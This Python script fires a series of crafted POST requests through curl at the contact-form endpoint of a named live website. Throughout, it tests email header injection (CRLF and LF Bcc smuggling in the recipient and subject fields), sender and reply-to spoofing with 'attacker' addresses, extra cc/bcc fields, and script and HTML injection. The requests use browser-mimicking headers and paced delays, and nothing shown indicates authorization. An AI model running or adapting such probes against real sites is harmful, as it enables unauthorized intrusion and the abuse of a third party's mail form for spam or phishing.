import subprocess, time, json
B = "https://www.infinitycapital.bh/api/send"
M  = "probe@www.infinitycapital.bh"
M2 = "probe2@www.infinitycapital.bh"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def post(fields):
    cmd = ["curl","-s","-o","/tmp/s.bin","-D","/tmp/s.hdr","-m","40","-X","POST",B,
           "-H","User-Agent: "+UA,"-H","Accept: */*",
           "-H","Origin: https://www.infinitycapital.bh",
           "-H","Referer: https://www.infinitycapital.bh/contact",
           "-H","Sec-Fetch-Dest: empty","-H","Sec-Fetch-Mode: cors","-H","Sec-Fetch-Site: same-origin"]
    for k,v in fields.items(): cmd += ["-F", f"{k}={v}"]
    subprocess.run(cmd, capture_output=True, text=True)
    hdr = open("/tmp/s.hdr", errors="ignore").read(); body = open("/tmp/s.bin","rb").read()
    return (hdr.splitlines()[0] if hdr else "NONE"), len(body), body[:600]

def base(**kw):
    d = {"fname":"Test","lname":"User","areacode":"973","tel":"1234567",
         "cname":"Test User","subject":"Inquiry","msg":"hello there","check":"","targets":"[]"}
    d.update(kw); return d

# 1) multiple recipients comma separated
print("T1 multi_to_csv      ", post(base(targets=M+","+M2)), flush=True); time.sleep(9)
# 2) CRLF header injection into targets
inj = M + "\r\nBcc: " + M2
print("T2 crlf_bcc          ", post(base(targets=inj)), flush=True); time.sleep(9)
# 3) LF-only injection
inj2 = M + "\nBcc: " + M2
print("T3 lf_bcc            ", post(base(targets=inj2)), flush=True); time.sleep(9)
# 4) extra from / replyTo spoofing fields
print("T4 from_spoof        ", post(base(targets=M, **{"from":"attacker@www.infinitycapital.bh",
      "replyTo":"attacker@www.infinitycapital.bh","reply_to":"attacker@www.infinitycapital.bh",
      "sender":"attacker@www.infinitycapital.bh"})), flush=True); time.sleep(9)
# 5) cc/bcc extra fields
print("T5 cc_bcc_fields     ", post(base(targets=M, cc=M2, bcc=M2)), flush=True); time.sleep(9)
# 6) HTML/script in msg + name (email body template)
print("T6 html_inject_msg   ", post(base(targets=M, msg="<script>alert(1)</script>",
      cname="<b>NameInj</b>", subject="<h1>SubjInj</h1>")), flush=True); time.sleep(9)
# 7) SMTP header injection in subject
print("T7 crlf_subject      ", post(base(targets=M, subject="Hi\r\nBcc: "+M2)), flush=True)
